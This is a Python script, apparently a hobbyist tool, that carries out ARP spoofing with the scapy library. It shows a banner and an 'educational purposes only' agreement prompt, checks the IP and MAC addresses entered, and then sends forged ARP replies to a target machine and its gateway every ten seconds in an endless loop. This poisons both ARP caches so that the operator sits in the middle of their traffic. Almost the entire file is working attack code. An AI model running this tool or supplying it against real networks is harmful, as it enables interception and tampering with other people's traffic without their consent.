import scapy.all as scapy
import string
import time
import os

def printBanner():
    bannerTxt = '''  _________                                   _____                       
 /   _____/_____   ____   ____   ____   _____/ ____\\          ___________ 
 \\_____  \\\\____ \\ /  _ \\ /  _ \\ /  _ \\ /  _ \\   __\\  ______ _/ __ \\_  __ \\
 /        \\  |_> >  <_> |  <_> |  <_> |  <_> )  |   /_____/ \\  ___/|  | \\/
/_______  /   __/ \\____/ \\____/ \\____/ \\____/|__|            \\___  >__|   
        \\/|__|                                                   \\/       '''
    print(bannerTxt)
    print('========================================================================')
    print("Welcome to the ARP Spoofer! Please ensure to use the format for IP and MAC addresses as mentioned below.\n")
    print("Formats:")
    print("IP\tx.x.x.x")
    print("(where x is an integer between 0 and 255 [both inclusive])\n")
    print("MAC\txx:xx:xx:xx:xx:xx")
    print("(where xx are hexadecimal numbers as given in your MAC address. eg: e3,a7,f1)\n")
    print("I agree to use this tool for educational purposes ONLY, not for anything illegal (y/n)",end=' ')
    agree = input()
    if not (agree == 'y' or agree == 'Y'):
        print("Why illegal? :(")
        os._exit(1)
    print('========================================================================')

def arp_poison(targetIP,targetMAC,spoofIP):
    try:        
        arp = scapy.ARP(op=2, pdst=targetIP, hwdst=targetMAC, psrc=spoofIP)
        scapy.send(arp,verbose=False)
    except:
        print("Error creating scapy packet. Please check your inputs!")
        os._exit(1)

def arp_spoof(targetIP,targetMAC,gatewayIP,gatewayMAC):
    count = 0
    try:
        while True:
            time.sleep(10)
            print('sent',count,'packets')
            arp_poison(targetIP,targetMAC,gatewayIP)
            arp_poison(gatewayIP,gatewayMAC,targetIP)
    except KeyboardInterrupt:
        os._exit(1)

def checkMAC(MACaddress):
    mac = MACaddress.strip().split(':')
    if len(mac) != 6:
        return False
    try:
        for x in mac:
            for y in x:
                assert(y in string.hexdigits)
    except:
        return False
    
    return True

def checkIP(IPaddress):    
    ip = IPaddress.strip().split('.')
    if len(ip) != 4:
        return False
    try:
        for x in ip:
            if int(x)<0 or int(x)>255:
                return False
    except:
        return False
    
    return True

def main():
    printBanner()
    targetIP = input("Enter target's IP: ")
    if not checkIP(targetIP):
        print("Incorrect IP format!")
        os._exit(1)
    targetMAC = input("Enter target's MAC: ").lower()
    if not checkMAC(targetMAC):
        print("Incorrect MAC format!")
        os._exit(1)
    gatewayIP = input("Enter gateway's IP: ")
    if not checkIP(gatewayIP):
        print("Incorrect IP format!")
        os._exit(1)
    gatewayMAC = input("Enter gateway's MAC: ").lower()
    if not checkMAC(gatewayMAC):
        print("Incorrect MAC format!")
        os._exit(1)

    arp_spoof(targetIP,targetMAC,gatewayIP,gatewayMAC)

if __name__ == '__main__':
    main()
else:
    os._exit(1)
